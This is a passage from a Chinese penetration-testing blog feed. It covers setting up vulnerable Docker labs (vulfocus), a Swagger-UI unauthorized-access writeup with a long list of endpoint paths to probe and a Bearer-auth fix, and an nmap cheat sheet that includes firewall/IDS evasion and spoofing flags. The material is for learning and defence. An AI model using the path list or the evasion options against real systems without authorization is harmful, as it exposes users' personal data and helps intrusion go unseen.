class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull medicean/vulapps:tools_xunfeng</span><br></pre></td></tr></table></figure><ol start="2"><li>启动环境</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8000:80 medicean/vulapps:tools_xunfeng</span><br></pre></td></tr></table></figure><blockquote><p>访问8000端口即可</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209271851473.png" alt="image-20220927185130286" style="zoom:50%;" /><h2 id="vulfocus"><a href="#vulfocus" class="headerlink" title="vulfocus"></a>vulfocus</h2><blockquote><p><a href="https://github.com/fofapro/vulfocus">https://github.com/fofapro/vulfocus</a></p><p><a href="https://hub.docker.com/u/vulfocus">https://hub.docker.com/u/vulfocus</a></p><p>Vulfocus 官网：<a href="https://fofapro.github.io/vulfocus/">https://fofapro.github.io/vulfocus/</a></p><p>在线 Vulfocus：</p><p><a href="http://vulfocus.fofa.so/">http://vulfocus.fofa.so/</a></p><p><a href="http://vulfocus.io/">http://vulfocus.io/</a></p><p><a href="http://vulfocus.club/">http://vulfocus.club/</a></p></blockquote><p><strong>新漏洞会立马集成上去！</strong></p><p>Vulfocus 是一个漏洞集成平台，将漏洞环境 docker 镜像，放入即可使用，开箱即用。</p><ol><li>通过docker拉取镜像vulfocus&#x2F;vulfocus</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull vulfocus/vulfocus:latest</span><br></pre></td></tr></table></figure><ol start="2"><li>开启靶场</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker create -p 88:80 -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=124.223.217.243 vulfocus/vulfocus</span><br></pre></td></tr></table></figure><blockquote><p>参数介绍：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注意：此处有坑(-p 前边的端口代表物理机的端口，后边的端口是docker的端口)</span><br><span class="line">-v /var/run/docker.sock:/var/run/docker.sock 为 docker 交互连接</span><br><span class="line">unix://var/run/docker.sock 进行连接，也可以通过 tcp://xxx.xxx.xxx.xxx:2375 进行连接（必须开放2375 端口）</span><br><span class="line">-e VUL_IP=xxx.xxx.xxx.xxx 为 Docker 服务器 IP ，不能为 127.0.0.1。一般不用-e选项，此处特殊</span><br></pre></td></tr></table></figure></blockquote><ol start="3"><li>上述步骤只算添加了docker容器，并未进行启动，需要通过命令</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker container start  接上述命令给出的容器id前四位即可</span><br></pre></td></tr></table></figure><ol start="4"><li><p>此时靶场开启打开浏览器访问服务器ip加88端口即可打开，我这里为124.223.217.243:88 默认账号密码为admin  admin</p></li><li><p>添加漏洞，注意搭建好后是没有漏洞的需要自行添加，存在三种方式，这里我们使用第一种和第二种</p></li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209271853862.png" alt="image-20220927185324678" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209271853039.png" alt="image-20220927185341856" style="zoom:50%;" /><ol start="6"><li>点击镜像会弹出漏洞编号和名字，选择好后进行提交即可自动进行下载。</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209271853443.png" alt="image-20220927185359269" style="zoom:50%;" /><ol start="7"><li>下载时会出现如下现象，如为出现则在启动时的命令更改为</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d --privileged -p 88:80 -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=124.223.217.243 vulfocus/vulfocus</span><br></pre></td></tr></table></figure><ol start="8"><li>可选择第二中本地导入，打开会自动读取服务器上存在的docker镜像，进行导入即可</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209271854281.png" alt="image-20220927185439090" style="zoom:50%;" /><p>至此docker搭建完成</p><p>关于这些dockerhub里面的漏洞环境，都好了，当我们需要某个漏洞时就去pull相应的漏洞镜像和容器，是通过.yml文件进行配置(用docker-compose）</p><h1 id="Docker使用所遇见的问题"><a href="#Docker使用所遇见的问题" class="headerlink" title="Docker使用所遇见的问题"></a>Docker使用所遇见的问题</h1><h2 id="修改端口映射："><a href="#修改端口映射：" class="headerlink" title="修改端口映射："></a>修改端口映射：</h2><blockquote><p>如果实在运行之中端口映射就比较麻烦：<a href="https://www.cnblogs.com/kingsonfu/p/11578073.html">https://www.cnblogs.com/kingsonfu/p/11578073.html</a><br>修改端口映射：<a href="https://www.cnblogs.com/guliang/p/14252109.html">https://www.cnblogs.com/guliang/p/14252109.html</a></p></blockquote><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p> <a href="https://blog.csdn.net/m0_37714245/article/details/81713477">Docker基础操作</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x03 - 云服务器与Docker</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/0x03-%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8EDocker.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/0x03-%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8EDocker.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="云服务器"><a href="#云服务器" class="headerlink" title="云服务器"></a>云服务器</h1><h2 id="云服务器介绍"><a href="#云服务器介绍" class="headerlink" title="云服务器介绍"></a>云服务器介绍</h2><blockquote><ul><li><a href="https://cloud.tencent.com/product/cvm">https://cloud.tencent.com/product/cvm</a></li><li><a href="https://www.aliyun.com/product/ecs/">https://www.aliyun.com/product/ecs/</a></li><li><a href="https://www.huaweicloud.com/theme/512014-1-G">https://www.huaweicloud.com/theme/512014-1-G</a></li></ul></blockquote><p>一台通过公网访问的虚拟服务器，可以是Windows、Linux系统。</p><p>在云计算还没进行普及的时候，个人或企业站点往往都是托管在IDC机房内，每一台物理服务器都需要一台机柜，每次购买物理服务器或者对服务器进行升级，我们的运维人员都需要跑老远去机房，然后在机房进行操作的，比如升级内存，添加新设备等操作。</p><h2 id="云服务选购"><a href="#云服务选购" class="headerlink" title="云服务选购"></a>云服务选购</h2><p>阿里云、腾讯云、华为云、Ucloud 服务器配置及价格对比：</p><blockquote><p><a href="http://www.aliyunbc.com/newsinfo/1157113.html">http://www.aliyunbc.com/newsinfo/1157113.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/457728444">https://zhuanlan.zhihu.com/p/457728444</a></p></blockquote><p>腾讯云(CVM)：</p><blockquote><p><a href="https://cloud.tencent.com/act/pro/618season?from=new&amp;page=618warmup#product">https://cloud.tencent.com/act/pro/618season?from=new&amp;page=618warmup#product</a></p></blockquote><p>阿里云(ECS)：</p><blockquote><p><a href="https://www.aliyun.com/minisite/goods?userCode=cb3vgkf5">https://www.aliyun.com/minisite/goods?userCode=cb3vgkf5</a></p></blockquote><p>华为云(HECS)：</p><blockquote><p><a href="https://activity.huaweicloud.com/discount_area_v5/index.html">https://activity.huaweicloud.com/discount_area_v5/index.html</a></p></blockquote><h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><blockquote><p>参考写过的dokcer学习文章：<a href="https://11pmsleep.github.io/2022-09-27-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Docker%E5%AD%A6%E4%B9%A0/">Docker 学习</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0x12 - Swagger-ui未授权访问漏洞</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/0x12-Swagger-ui%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/0x12-Swagger-ui%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Swagger-ui未授权访问漏洞</p><p>有时间再回头了重新捋一下</p><h1 id="Swagger简介"><a href="#Swagger简介" class="headerlink" title="Swagger简介"></a>Swagger简介</h1><p>Swagger是一个规范和完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务，JAVA在金融机构开发语言的地位一直居高不下，而作为JAVA届服务端的大一统框架Spring，便将Swagger规范纳入自身的标准，建立了Spring-swagger项目，所以在实际测试环境中，基于spring框架的swagger-ui接口展示及调试文档页面最为常见。</p><h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>可利用未授权访问漏洞，直接访问以下链接：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api</span><br><span class="line">/api-docs</span><br><span class="line">/api-docs/swagger.json</span><br><span class="line">/api.html</span><br><span class="line">/api/api-docs</span><br><span class="line">/api/apidocs</span><br><span class="line">/api/doc</span><br><span class="line">/api/swagger</span><br><span class="line">/api/swagger-ui</span><br><span class="line">/api/swagger-ui.html</span><br><span class="line">/api/swagger-ui.html/</span><br><span class="line">/api/swagger-ui.json</span><br><span class="line">/api/swagger.json</span><br><span class="line">/api/swagger/</span><br><span class="line">/api/swagger/ui</span><br><span class="line">/api/swagger/ui/</span><br><span class="line">/api/swaggerui</span><br><span class="line">/api/swaggerui/</span><br><span class="line">/api/v1/</span><br><span class="line">/api/v1/api-docs</span><br><span class="line">/api/v1/apidocs</span><br><span class="line">/api/v1/swagger</span><br><span class="line">/api/v1/swagger-ui</span><br><span class="line">/api/v1/swagger-ui.html</span><br><span class="line">/api/v1/swagger-ui.json</span><br><span class="line">/api/v1/swagger.json</span><br><span class="line">/api/v1/swagger/</span><br><span class="line">/api/v2</span><br><span class="line">/api/v2/api-docs</span><br><span class="line">/api/v2/apidocs</span><br><span class="line">/api/v2/swagger</span><br><span class="line">/api/v2/swagger-ui</span><br><span class="line">/api/v2/swagger-ui.html</span><br><span class="line">/api/v2/swagger-ui.json</span><br><span class="line">/api/v2/swagger.json</span><br><span class="line">/api/v2/swagger/</span><br><span class="line">/api/v3</span><br><span class="line">/apidocs</span><br><span class="line">/apidocs/swagger.json</span><br><span class="line">/doc.html</span><br><span class="line">/docs/</span><br><span class="line">/druid/index.html</span><br><span class="line">/graphql</span><br><span class="line">/libs/swaggerui</span><br><span class="line">/libs/swaggerui/</span><br><span class="line">/spring-security-oauth-resource/swagger-ui.html</span><br><span class="line">/spring-security-rest/api/swagger-ui.html</span><br><span class="line">/sw/swagger-ui.html</span><br><span class="line">/swagger</span><br><span class="line">/swagger-resources</span><br><span class="line">/swagger-resources/configuration/security</span><br><span class="line">/swagger-resources/configuration/security/</span><br><span class="line">/swagger-resources/configuration/ui</span><br><span class="line">/swagger-resources/configuration/ui/</span><br><span class="line">/swagger-ui</span><br><span class="line">/swagger-ui.html</span><br><span class="line">/swagger-ui.html#/api-memory-controller</span><br><span class="line">/swagger-ui.html/</span><br><span class="line">/swagger-ui.json</span><br><span class="line">/swagger-ui/swagger.json</span><br><span class="line">/swagger.json</span><br><span class="line">/swagger.yml</span><br><span class="line">/swagger/</span><br><span class="line">/swagger/index.html</span><br><span class="line">/swagger/static/index.html</span><br><span class="line">/swagger/swagger-ui.html</span><br><span class="line">/swagger/ui/</span><br><span class="line">/Swagger/ui/index</span><br><span class="line">/swagger/ui/index</span><br><span class="line">/swagger/v1/swagger.json</span><br><span class="line">/swagger/v2/swagger.json</span><br><span class="line">/template/swagger-ui.html</span><br><span class="line">/user/swagger-ui.html</span><br><span class="line">/user/swagger-ui.html/</span><br><span class="line">/v1.x/swagger-ui.html</span><br><span class="line">/v1/api-docs</span><br><span class="line">/v1/swagger.json</span><br><span class="line">/v2/api-docs</span><br><span class="line">/v3/api-docs</span><br></pre></td></tr></table></figure><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>Swagger未开启页面访问限制，Swagger未开启严格的Authorize认证。</p><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>通过翻查文档，得到api接口，点击parameters，即可得到该api接口的详细参数。直接构造参数发包，通过回显可以得到大量的用户信息，包含了手机号，邮箱等。</p><h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><ol><li><p>Swagger开启页面访问限制。</p></li><li><p>Swagger开启Authorize认证。</p></li></ol><blockquote><p>找到Startup文件，我们看到Swagger的配置如下：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">services.AddSwaggerGen(options =&gt; &#123; options.SwaggerDoc(“v1”, new Info &#123; Title = “YjJob API”, Version = “v1” &#125;); options.DocInclusionPredicate((docName, description) =&gt; true); &#125;);</span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">services.AddSwaggerGen(options =&gt; &#123; options.SwaggerDoc(“v1”, new Info &#123; Title = “YjJob API”, Version = “v1” &#125;); options.DocInclusionPredicate((docName, description) =&gt; true); options.AddSecurityDefinition(“Bearer”, new ApiKeyScheme &#123; Description = “Authorization format : Bearer &#123;token&#125;”, Name = “Authorization”, In = “header”, Type = “apiKey” &#125;);//api界面新增authorize按钮 &#125;);</span><br></pre></td></tr></table></figure><p>修改后我们可以看到生成的Swagger UI界面新增了一个“Authorize”按钮： </p><p><img src="https://gitee.com/Monika_Mannix/mannix/raw/master/img/202112312342738.png" alt="img"> </p><p>点击“Authorize”按钮弹出以下界面 </p><p><img src="https://gitee.com/Monika_Mannix/mannix/raw/master/img/202112312342013.png" alt="img"> </p><p>在value文本框中输入”Bearer “+token(登陆接口返回的access_token),然后点击“Authorize”按钮，之后再调用需要权限验证的接口就可以正常调用。 </p><h1 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h1><p>应用系统存在Swagger-ui未授权访问，可获取系统的API接口方法。 </p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://0.0.0.0:8888/mobile/swagger-resources </span><br><span class="line">http://0.0.0.0:8888/mobile/swagger-resources/configuration/ui </span><br><span class="line">http://0.0.0.0:8888/mobile/swagger-resources/configuration/security </span><br><span class="line">http://0.0.0.0:8888/mobile/swagger-ui.html </span><br><span class="line">http://0.0.0.0:8888/mobile/v2/api-docs </span><br><span class="line">http://0.0.0.0:8888/mobile/swagger-ui.html</span><br></pre></td></tr></table></figure><p>成功遍历到用户</p><p><a href="https://www.moonsec.com/wp-content/uploads/2022/04/61650736509.png"><img src="https://www.moonsec.com/wp-content/uploads/2022/04/61650736509.png" alt="null" style="zoom:50%;" /></a></p><p><a href="https://www.moonsec.com/wp-content/uploads/2022/04/41650736510.png"><img src="https://www.moonsec.com/wp-content/uploads/2022/04/41650736510.png" alt="null" style="zoom:50%;" /></a></p><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p><a href="https://www.moonsec.com/4096.html">Swagger-ui未授权访问漏洞</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> WEB安全 </category>
          
          <category> 历史漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 历史漏洞 </tag>
            
            <tag> 未授权访问漏洞 </tag>
            
            <tag> Swagger </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap学习</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/nmap%E5%AD%A6%E4%B9%A0.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/nmap%E5%AD%A6%E4%B9%A0.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Nmap介绍"><a href="#Nmap介绍" class="headerlink" title="Nmap介绍"></a>Nmap介绍</h1><p>Network Mapper，是一款开放源代码的网络探测和安全审核的工具</p><p>Nmap既能应用于简单的网络信息扫描，也能用在高级、复杂、特定的环境中：例如扫描互联网上大量的主机；绕开防火墙&#x2F;IDS&#x2F;IPS；扫描Web站点；扫描路由器</p><h2 id="nmap端口状态"><a href="#nmap端口状态" class="headerlink" title="nmap端口状态"></a>nmap端口状态</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Open                #端口开启，数据有到达主机，有程序在端口上监控</span><br><span class="line">Closed              #端口关闭，数据有到达主机，没有程序在端口上监控</span><br><span class="line">Filtered            #数据没有到达主机，返回的结果为空，数据被防火墙或IDS过滤</span><br><span class="line">UnFiltered          #数据有到达主机，但是不能识别端口的当前状态</span><br><span class="line">Open|Filtered       #端口没有返回值，主要发生在UDP、IP、FIN、NULL和Xmas扫描中</span><br><span class="line">Closed|Filtered     #只发生在IP ID idle扫描</span><br></pre></td></tr></table></figure><h2 id="nmap功能"><a href="#nmap功能" class="headerlink" title="nmap功能"></a>nmap功能</h2><blockquote><ol><li>检测网络存活主机（主机发现）</li><li>检测主机开放端口（端口发现或枚举）</li><li>检测相应端口软件（服务发现）版本</li><li>检测操作系统，硬件地址，以及软件版本</li><li>检测脆弱性的漏洞（nmap的脚本）</li></ol></blockquote><h1 id="nmap安装"><a href="#nmap安装" class="headerlink" title="nmap安装"></a>nmap安装</h1><h2 id="Linux安装nmap"><a href="#Linux安装nmap" class="headerlink" title="Linux安装nmap"></a>Linux安装nmap</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Centos：yum -y install nmap</span><br><span class="line">Ubuntu：apt -y install nmap</span><br></pre></td></tr></table></figure><h2 id="Windows下安装namp"><a href="#Windows下安装namp" class="headerlink" title="Windows下安装namp"></a>Windows下安装namp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#nmap-7.80安装程序：</span><br><span class="line">https://nmap.org/dist/nmap-7.80-setup.exe</span><br><span class="line">#npcap-0.9987：</span><br><span class="line">https://nmap.org/npcap/dist/npcap-0.9987.exe</span><br><span class="line">#nmap-7.80的zip包：</span><br><span class="line">https://nmap.org/dist/nmap-7.80-win32.zip</span><br></pre></td></tr></table></figure><h1 id="nmap参数查询"><a href="#nmap参数查询" class="headerlink" title="nmap参数查询"></a>nmap参数查询</h1><h2 id="Nmap网段表示方式"><a href="#Nmap网段表示方式" class="headerlink" title="Nmap网段表示方式"></a>Nmap网段表示方式</h2><blockquote><p>Nmap支持主机名，IP，网段的表示方式<br>例如： <code>blah.highon.coffee</code> 、 <code>namp.org/24</code>  、 <code>192.168.0.1</code> 、 <code>10.0.0-25.1-254</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-iL filename                从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段</span><br><span class="line">-iR hostnum                 随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描</span><br><span class="line">--exclude host1[, host2]    从扫描任务中需要排除的主机</span><br><span class="line">--exculdefile exclude_file  排除文件中的IP,格式和-iL指定扫描文件的格式相同</span><br></pre></td></tr></table></figure><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sL                         仅仅是显示,扫描的IP数目,不会进行任何扫描</span><br><span class="line">-sn                         ping扫描,即主机发现</span><br><span class="line">-Pn                         不检测主机存活</span><br><span class="line">-PS/PA/PU/PY[portlist]  TCP SYN Ping/TCP ACK Ping/UDP   Ping发现</span><br><span class="line">-PE/PP/PM                   使用ICMP echo, timestamp and netmask 请求包发现主机</span><br><span class="line">-PO[prococol list]          使用IP协议包探测对方主机是否开启</span><br><span class="line">-n/-R                       不对IP进行域名反向解析/为所有的IP都进行域名的反响解析</span><br></pre></td></tr></table></figure><h2 id="扫描技巧"><a href="#扫描技巧" class="headerlink" title="扫描技巧"></a>扫描技巧</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sS/sT/sA/sW/sM                TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描</span><br><span class="line">-sU                            UDP扫描</span><br><span class="line">-sN/sF/sX                      TCP Null，FIN，and Xmas扫描</span><br><span class="line">--scanflags                    自定义TCP包中的flags</span><br><span class="line">-sI zombie host[:probeport]    Idlescan</span><br><span class="line">-sY/sZ                         CTP INIT/COOKIE-ECHO 扫描</span><br><span class="line">-sO                            使用IP protocol 扫描确定目标机支持的协议类型</span><br><span class="line">-b &quot;FTP relay host&quot;            使用FTP bounce scan</span><br></pre></td></tr></table></figure><h2 id="指定端口和扫描顺序"><a href="#指定端口和扫描顺序" class="headerlink" title="指定端口和扫描顺序"></a>指定端口和扫描顺序</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p                            特定的端口 -p80,443 或者 -p1-65535</span><br><span class="line">-p U:PORT                     扫描udp的某个端口, -p U:53</span><br><span class="line">-F                            快速扫描模式,比默认的扫描端口还少</span><br><span class="line">-r                            不随机扫描端口,默认是随机扫描的</span><br><span class="line">--top-ports &quot;number&quot;          扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个</span><br><span class="line"></span><br><span class="line">--port-ratio &quot;ratio&quot;          扫描指定频率以上的端口</span><br></pre></td></tr></table></figure><h2 id="服务版本识别"><a href="#服务版本识别" class="headerlink" title="服务版本识别"></a>服务版本识别</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sV                           开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测</span><br><span class="line">--version-intensity &quot;level&quot;   设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7</span><br><span class="line">--version-light               打开轻量级模式,为--version-intensity 2的别名</span><br><span class="line">--version-all                 尝试所有探测,为--version-intensity 9的别名</span><br><span class="line">--version-trace               显示出详细的版本侦测过程信息</span><br></pre></td></tr></table></figure><h2 id="脚本扫描"><a href="#脚本扫描" class="headerlink" title="脚本扫描"></a>脚本扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sC                         根据端口识别的服务,调用默认脚本</span><br><span class="line">--script=”Lua scripts”      调用的脚本名</span><br><span class="line">--script-args=n1=v1,[n2=v2]  调用的脚本传递的参数</span><br><span class="line">--script-args-file=filename   使用文本传递参数</span><br><span class="line">--script-trace                显示所有发送和接收到的数据</span><br><span class="line">--script-updatedb           更新脚本的数据库</span><br><span class="line">--script-help=”Lua script”  显示指定脚本的帮助</span><br></pre></td></tr></table></figure><h2 id="OS识别"><a href="#OS识别" class="headerlink" title="OS识别"></a>OS识别</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-O                          启用操作系统检测,-A来同时启用操作系统检测和版本检测</span><br><span class="line">--osscan-limit            针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)</span><br><span class="line">--osscan-guess            推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配</span><br></pre></td></tr></table></figure><h2 id="防火墙-x2F-IDS躲避和哄骗"><a href="#防火墙-x2F-IDS躲避和哄骗" class="headerlink" title="防火墙&#x2F;IDS躲避和哄骗"></a>防火墙&#x2F;IDS躲避和哄骗</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-f; --mtu value             指定使用分片、指定数据包的MTU.</span><br><span class="line">-D decoy1,decoy2,ME         使用诱饵隐蔽扫描</span><br><span class="line">-S IP-ADDRESS               源地址欺骗</span><br><span class="line">-e interface                使用指定的接口</span><br><span class="line">-g/ --source-port PROTNUM   使用指定源端口</span><br><span class="line">--proxies url1,[url2],...   使用HTTP或者SOCKS4的代理</span><br><span class="line">--data-length NUM           填充随机数据让数据包长度达到NUM</span><br><span class="line">--ip-options OPTIONS        使用指定的IP选项来发送数据包</span><br><span class="line">--ttl VALUE                 设置IP time-to-live域</span><br><span class="line">--spoof-mac ADDR/PREFIX/VEBDOR    MAC地址伪装</span><br><span class="line">--badsum                    使用错误的checksum来发送数据包</span><br></pre></td></tr></table></figure><h2 id="Nmap-输出"><a href="#Nmap-输出" class="headerlink" title="Nmap 输出"></a>Nmap 输出</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-oN                     将标准输出直接写入指定的文件</span><br><span class="line">-oX                     输出xml文件</span><br><span class="line">-oS                     将所有的输出都改为大写</span><br><span class="line">-oG                     输出便于通过bash或者perl处理的格式,非xml</span><br><span class="line">-oA BASENAME            可将扫描结果以标准格式、XML格式和Grep格式一次性输出</span><br><span class="line">-v                      提高输出信息的详细度</span><br><span class="line">-d level                设置debug级别,最高是9</span><br><span class="line">--reason                显示端口处于带确认状态的原因</span><br><span class="line">--open                  只输出端口状态为open的端口</span><br><span class="line">--packet-trace          显示所有发送或者接收到的数据包</span><br><span class="line">--iflist                显示路由信息和接口,便于调试</span><br><span class="line">--log-errors            把日志等级为errors/warings的日志输出</span><br><span class="line">--append-output         追加到指定的文件</span><br><span class="line">--resume FILENAME       恢复已停止的扫描</span><br><span class="line">--stylesheet PATH/URL   设置XSL样式表，转换XML输出</span><br><span class="line">--webxml                从namp.org得到XML的样式</span><br><span class="line">--no-sytlesheet         忽略XML声明的XSL样式表</span><br></pre></td></tr></table></figure><h2 id="时间性能优化"><a href="#时间性能优化" class="headerlink" title="时间性能优化"></a>时间性能优化</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-T                      时间优化(0-5)(paranoid|sneaky|polite|normal|aggressive|insane).速度越快准确性越低</span><br><span class="line">-F                      快速扫描。</span><br><span class="line">--host-timeout time     设置扫描主机的最大时间</span><br><span class="line">--defeat-rst-ratelimit  设置rst的限制</span><br><span class="line">--max-retries           调整重传次数。</span><br><span class="line">--max-retries tries     指定探针重传转发数</span><br><span class="line">--min-hostgroup/--max-hostgroup size      设置组的大小</span><br><span class="line">--min-parallelism/--max-parellelism time  指定时间内的探针数</span><br><span class="line">--scan-delay/-max-scan-delay time         指定探针之间的时延</span><br><span class="line">--min-rtt-timrout/--max-rtt-timrout/initial-rtt-timrouttime   指定探针超时</span><br></pre></td></tr></table></figure><h2 id="其他nmap选项"><a href="#其他nmap选项" class="headerlink" title="其他nmap选项"></a>其他nmap选项</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-6                        开启IPv6</span><br><span class="line">-A                        OS识别,版本探测,脚本扫描和traceroute</span><br><span class="line">-V                        打印版本信息</span><br><span class="line">-h                        输出帮助</span><br><span class="line">--datedir DIRNAME         明用户Nmap数据文件位置</span><br><span class="line">--send-eth / --send-ip    用原以太网帧发送/在原IP层发送</span><br><span class="line">--privileged              假定用户具有全部权限</span><br><span class="line">--unprovoleged            假定用户不具有全部权限,创建原始套接字需要root权限</span><br></pre></td></tr></table></figure><h1 id="nmap用法"><a href="#nmap用法" class="headerlink" title="nmap用法"></a>nmap用法</h1><h2 id="基础用法"><a href="#基础用法" class="headerlink" title="基础用法"></a>基础用法</h2><blockquote><p>Nmap默认发送一个arp的ping数据包，来探测目标主机在1-10000范围内所开放的端口.</p><p>Nmap默认扫描只扫描1000个最可能开放的端口</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">单一主机扫描：</span></span><br><span class="line">namp 192.168.1.2</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">子网扫描：</span></span><br><span class="line">namp 192.168.1.1/24</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">多主机扫描：</span></span><br><span class="line">nmap 192.168.1.1 192.168.1.10</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">主机范围扫描：</span></span><br><span class="line">namp 192.168.1.1-100</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">IP地址列表扫描：</span></span><br><span class="line">nmap –iL target.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示扫描的主机列表：</span></span><br><span class="line">nmap -sL 192.168.1.1/24</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">扫描除指定IP外的所有子网主机：</span></span><br><span class="line">nmap 192.168.1.1/24 --exclude 192.168.1.1</span><br><span class="line"><span 